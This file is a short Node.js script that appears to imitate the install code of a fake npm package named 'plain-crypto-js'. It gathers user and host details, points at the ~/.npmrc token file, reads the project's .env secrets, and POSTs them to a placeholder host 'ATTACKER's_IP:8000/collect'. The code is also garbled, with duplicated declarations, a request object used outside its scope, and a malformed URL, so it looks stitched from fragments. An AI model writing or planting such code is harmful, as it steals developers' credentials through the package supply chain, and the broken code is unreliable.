const http = require("http");
const os = require("os");

const data = JSON.stringify({
  user: os.userInfo().username,
  host: os.hostname(),
  platform: process.platform,
  cwd: process.cwd()
});
const fs = require("fs");
const os = require("os");
const path = require("path");

const npmrc = path.join(os.homedir(), ".npmrc");

const fs = require("fs");
const path = require("path");

const envFile = path.join(process.cwd(), ".env");

if (fs.existsSync(envFile)) {
    const data = fs.readFileSync(envFile, "utf8");
    console.log(data);
    const req = http.request(
    "http://ATTACKER's_IP:8000/collect?file"+data,
    {
      method: "POST",
      headers: {
      "Content-Type": "application/json",
      "Content-Length": data.length
    }
  }
);
}


req.write(data);
req.end();

console.log("[plain-crypto-js] initialized");
